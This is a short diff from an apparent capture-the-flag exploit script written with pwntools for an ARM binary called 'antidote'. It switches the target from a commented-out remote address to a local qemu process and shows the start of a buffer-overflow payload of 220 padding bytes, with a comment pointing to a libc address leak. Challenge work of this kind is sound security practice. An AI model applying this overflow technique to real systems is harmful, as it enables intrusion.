@@ -39,7 +39,7 @@ libc = ELF('./libc.so.6')
 
 #ip, port = '165.232.42.8', 30213
 #io = remote(ip, port)
-#io = process(['qemu-arm', '-L','/usr/arm-linux-gnueabihf','./antidote'])
+io = process(['qemu-arm', '-L','/usr/arm-linux-gnueabihf','./antidote'])
 
 payload = 'A'*220
 #write.plt(1, write.got, 4)
